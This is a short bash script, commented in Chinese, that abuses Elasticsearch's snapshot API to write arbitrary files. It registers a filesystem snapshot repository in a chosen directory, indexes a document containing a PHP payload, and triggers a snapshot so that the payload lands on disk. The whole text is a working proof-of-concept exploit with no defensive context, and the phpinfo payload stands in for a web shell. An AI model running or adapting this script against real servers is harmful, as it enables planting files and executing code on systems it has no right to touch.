#!/bin/bash
# 利用 snapshot 方法写任意文件

es=http://127.0.0.1:9200/
idx=anything
dir=/tmp/droptest

curl -XPUT $es/_snapshot/my_backup -d '{
    "type": "fs",
    "settings": {
        "location": "'$dir'",
        "compress": true
    }
}'; echo

curl $es/$idx/aaa/ -d '{ "aaa": "<?php phpinfo(); ?>"}'; echo

curl "$es/_snapshot/my_backup?wait_for_completion=true"; echo
curl $es/_snapshot/my_backup/snapshot123 -XPUT -d '{ "indices": "'$idx'" }'; echo

